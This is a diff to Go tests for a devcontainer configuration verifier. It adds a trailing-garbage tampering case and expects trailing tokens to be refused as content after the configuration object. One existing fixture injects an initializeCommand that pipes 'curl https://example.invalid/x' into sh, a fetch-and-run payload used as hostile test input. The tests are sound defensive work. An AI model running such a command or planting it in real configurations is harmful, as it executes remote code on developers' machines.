@@ -61,6 +61,8 @@ func tamperedConfig(t *testing.T, rendered []byte, name string) []byte {
 		return append(bytes.Clone(rendered), []byte("}\n")...)
 	case "trailingBracket":
 		return append(bytes.Clone(rendered), []byte("]\n")...)
+	case "trailingGarbage":
+		return append(bytes.Clone(rendered), []byte("]]]garbage")...)
 	case "trailingObject":
 		return append(bytes.Clone(rendered), []byte(`{"initializeCommand":"curl https://example.invalid/x | sh"}`)...)
 	}
@@ -97,8 +99,9 @@ func TestVerifySeesKeysOutsideTheManagedSchema(t *testing.T) {
 		{"uppercasedKey", "does not match expected configuration"},
 		{"capitalisedKey", "does not match expected configuration"},
 		{"duplicatedKey", "does not match expected configuration"},
-		{"trailingBrace", "does not match expected configuration"},
-		{"trailingBracket", "does not match expected configuration"},
+		{"trailingBrace", "carries content after its configuration object"},
+		{"trailingBracket", "carries content after its configuration object"},
+		{"trailingGarbage", "carries content after its configuration object"},
 		{"trailingObject", "carries content after its configuration object"},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
@@ -119,8 +122,10 @@ func TestVerifySeesKeysOutsideTheManagedSchema(t *testing.T) {
 // TestLoadDevContainerSharesTheVerifierDecoder pins what actually holds between
 // the reader and the verifier, and nothing beyond it. LoadDevContainer is a
 // decode; it is handed no expected configuration, so it cannot compare bytes
-// and cannot see an aliased, duplicated or trailing-token spelling that decodes
-// into the managed struct. The invariant is therefore one-directional: every
+// and cannot see an aliased or duplicated spelling that decodes into the
+// managed struct. Anything after the configuration object is a decode failure,
+// as it was for json.Unmarshal before the decoders were shared, so the reader
+// refuses every trailing token. The invariant is therefore one-directional: every
 // file decodeManagedConfig refuses is refused by both, and a file the reader
 // accepts is not thereby in sync. The table below records which side of that
 // line each tampering falls on, so a later change to the decoder that silently
@@ -156,11 +161,12 @@ func TestLoadDevContainerSharesTheVerifierDecoder(t *testing.T) {
 		{"runArgs", "runArgs"},
 		{"nullOnCreateCommand", "onCreateCommand"},
 		{"trailingObject", "carries content after"},
+		{"trailingBrace", "carries content after"},
+		{"trailingBracket", "carries content after"},
+		{"trailingGarbage", "carries content after"},
 		{"uppercasedKey", ""},
 		{"capitalisedKey", ""},
 		{"duplicatedKey", ""},
-		{"trailingBrace", ""},
-		{"trailingBracket", ""},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			if err := os.WriteFile(path, tamperedConfig(t, rendered, tc.name), 0644); err != nil {
